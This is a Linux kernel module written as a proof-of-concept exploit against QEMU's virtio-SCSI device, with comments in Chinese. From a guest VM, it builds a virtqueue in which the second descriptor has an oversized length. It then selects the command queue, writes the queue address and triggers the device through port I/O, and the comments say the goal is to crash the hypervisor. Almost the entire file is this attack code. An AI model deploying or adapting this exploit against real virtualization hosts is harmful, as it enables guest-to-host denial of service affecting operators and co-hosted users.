#include <linux/io.h>
#include <linux/ioport.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <asm/io.h>

MODULE_LICENSE("GPL");

// === 1. 定義常數與端口 ===
// Virtio SCSI 的 Base Port 預設是 0xc040
//  lspci -v 確認是否為 c040
#define VIRTIO_SCSI_IO_BASE 0xc040 

// Virtio PCI 的寄存器偏移量
#define VIRTIO_PCI_QUEUE_PFN    8
#define VIRTIO_PCI_QUEUE_SEL    14
#define VIRTIO_PCI_QUEUE_NOTIFY 16

// === 2. 定義 Virtio 環形結構體 ===
// vring descriptor
struct vring_desc {
    u64 addr;
    u32 len;
    u16 flags;
    u16 next;
};

// Available Ring
// ring[] 大小預設為 128 
struct vring_avail {
    u16 flags;
    u16 idx;
    u16 ring[128]; 
};

// === 3. 攻擊核心邏輯 ===
int handle_cmd(void)
{
    struct vring_desc *desc;
    struct vring_avail *avail;
    void* mem;
    u32 phys_addr;
    
    // 分配一塊記憶體作為 Virtqueue (vring descriptor + Avail Ring + Used Ring)
    // 分配 0x3000 大小
    mem = kmalloc(0x3000, GFP_KERNEL);
    if (!mem) {
        printk(KERN_ERR "Failed to allocate memory\n");
        return -1;
    }
    memset(mem, 0, 0x3000);

    // 計算物理位址，因為設備只能看懂物理位址
    phys_addr = (u32)virt_to_phys(mem);

    // 設定指針位置
    // vring descriptor在開頭
    desc = (struct vring_desc *)mem;
    // Avail Ring 在 0x800 (128 * 16 bytes)
    avail = (struct vring_avail *)(mem + 0x800);

    // --- 構造惡意 Payload (參考文件 POC 部分) ---
    // "New POC"
    
    // 描述符 0: 正常的 Header，指向自己，Flags 設定為 NEXT (有下一個)
    desc[0].addr = (u64)phys_addr;
    desc[0].len = (u32)0x33;      // 隨意長度
    desc[0].flags = 0x1;          // VRING_DESC_F_NEXT
    desc[0].next = 1;             // 下一個是 index 1

    // 描述符 1: 惡意的 Body，觸發溢出
    desc[1].addr = (u64)phys_addr; // 指向哪裡不重要，重點是長度
    desc[1].flags = 0x2;           // VRING_DESC_F_WRITE
    desc[1].next = 0;              // 鏈結結束
    // 設定超大長度 0x44444444，導致 QEMU 記憶體映射失敗返回 NULL
    desc[1].len = 0x44444444;      

    // --- 更新 Available Ring ---
    // 告訴設備：第 0 個描述符鏈已經準備好了
    avail->ring[0] = 0; // 索引指向 desc[0]
    avail->idx = 1;     // 更新索引，表示有一個任務

    // --- I/O 交互：通知 QEMU 執行 (notify) ---
    
    printk(KERN_ALERT " [+] Selecting Queue 2...\n");
    // 1. 寫入 Queue Select (Queue 2 是 CMD Queue)
    // 使用 outw (寫入 word/2 bytes) 到 port + 14
    outw(2, VIRTIO_SCSI_IO_BASE + VIRTIO_PCI_QUEUE_SEL);

    printk(KERN_ALERT " [+] Setting PFN (Address)...\n");
    // 2. 寫入 PFN (物理位址 >> 12)
    // 使用 outl (寫入 long/4 bytes) 到 port + 8
    outl(phys_addr >> 12, VIRTIO_SCSI_IO_BASE + VIRTIO_PCI_QUEUE_PFN);

    printk(KERN_ALERT " [+] Notifying Device (TRIGGER)...\n");
    // 3. 寫入 Notify (Queue Index 2)
    // 使用 outw 到 port + 16，這會觸發 virtio_ioport_write -> virtio_queue_notify
    outw(2, VIRTIO_SCSI_IO_BASE + VIRTIO_PCI_QUEUE_NOTIFY);

    // 正常來說，執行到這裡 QEMU 應該已經崩潰了。
    // 如果沒崩潰，記憶體還是要釋放一下
    // kfree(mem); // 實戰中通常不釋放以保留現場，但在這裡為了穩定性可以註解掉
    return 0;
}

int moduleInit(void)
{
    printk(KERN_ALERT " [+] Start Exploit Module\n");
    handle_cmd();
    return 0;
}

int moduleExit(void)
{
    printk(KERN_ALERT " [+] Exit Exploit Module\n");
    return 0;
}

module_init(moduleInit);
module_exit(moduleExit);